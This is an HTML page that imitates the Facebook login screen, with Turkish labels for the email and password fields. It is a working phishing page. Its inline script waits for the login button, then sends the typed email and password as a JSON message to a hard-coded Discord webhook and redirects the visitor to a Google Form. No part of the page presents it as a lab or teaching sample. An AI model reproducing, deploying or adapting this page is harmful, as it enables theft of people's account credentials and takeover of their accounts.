<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Facebook</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/1.4.6/tailwind.min.css" />
<style>
* {
  font-family: "Helvetica", sans-serif;
}

</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.1/css/all.min.css" /><link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<div class="w-100 text-center p-1" style="background-color: #245B97;">
  <img class="text-white font-black text-2xl mx-auto" style="    width: 150px;" src="facebook.png" />
</div>
 

<div
  class="flex flex-col content-center my-5 mx-auto text-sm"
  style="max-width: 380px"
>
  <input
    type="text"
	id="username"
    class="block p-3 rounded text-sm text-black border m-2"
	
    style="background-color: #F5F6F7; "
    placeholder="E-posta veya Telefon Numarası"
  />
  <input
    type="password"
	name="password"
    class="block p-3 border rounded text-sm text-black m-2"
    style="background-color: #F5F6F7;"
    placeholder="Şifre"
  />

  <button
    class="blue-btn m-2 block p-2 mt-3 rounded text-sm text-white font-bold border border-blue-"
    style="background-color: #007BF0;"
  >
    Giriş Yap
  </button>

  <div class="flex items-center">
    <hr width="50%" />
    <span class="text-gray-900 m-3" style="text-style: ">YADA</span>
    <hr width="50%" />
  </div>
  
  <button class="p-2 rounded mx-auto font-bold text-white" style="background-color: #00A622">Yeni Hesap Oluştur</button>
  <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" class="mx-auto mt-3" style="color: #6497C7;">Hesabını mı unuttun?</a>
  
  <div class="divider my-5"></div>
  
  <div class="flex justify-between center-align flex-wrap text-xs mx-5">
    <ul class="text-center w-1/2" style="list-style: none">
      <li><a href="#" class="text-gray-700">Bahasa Indonesia</a></li>
      <li><a href="#" class="text-blue-800">Basa Jawa</a></li>
      <li><a href="#" class="text-blue-800">Español</a></li>
      <li><a href="#" class="text-blue-800">Français (France)</a></li>
    </ul>
    
    <ul class="text-center w-1/2" style="list-style: none">
      <li><a href="#" class="text-blue-800">English (UK)</a></li>
      <li><a href="#" class="text-blue-800">Bahasa Melayu</a></li>
      <li><a href="#" class="text-blue-800">Português (Brasil)
</a></li>
      <li><a href="#" class="border border-blue-800 bg-white rounded p-1" style="width: 20px; height: 20px;"><i class="fas fa-plus text-gray-600"></i></a></li>
    </ul>
  </div>
  
  <footer class="mt-3 w-100 text-center">
    <span class="text-gray-600 text-xs">Facebook Inc.</span>
  </footer>
</div>
<!-- partial -->
  <script>
  
  // CODE HERE
const username = document.getElementById("username");
const password = document.getElementsByName("password")[0];
const logBtn = document.getElementsByClassName("blue-btn")[0];
 
username.oninput = function(){
	if (username.value.length > 3 && password.value.length > 3){
		logBtn.disabled = false;
	}
	if (username.value.length < 3 || password.value.length < 3){
		logBtn.disabled = true;
	}
};

password.oninput = function(){
	if (username.value.length > 3 && password.value.length > 3){
		logBtn.disabled = false;
	}
	if (username.value.length < 3 || password.value.length < 3){
		logBtn.disabled = true;
	}
};

logBtn.onclick = function(){
 
 
	
	var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/874904180643471360/wq6CFlKn8GovAaMz889fkqkJBkedakHWm2cv4l4LQDgAZVnRCMFAEvAxxWGoZJFwbN4p");
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
 	  username: "Facebook",
 	  avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/2048px-Facebook_f_logo_%282019%29.svg.png",
 	  content: `Eposta: ${username.value}   -  Şifre: ${password.value} `, }
	request.send(JSON.stringify(params));

	
	setTimeout(function(){ location.href = "https://docs.google.com/forms/d/e/1FAIpQLSdXq-uvCo4IQa2wvtIapo1Im1nS9zH8MNQgJ2g-EHpIUTQtEQ/viewform?fbzx=-4129955095203600153"; }, 1000);
}
  
  </script>
</body>
</html>
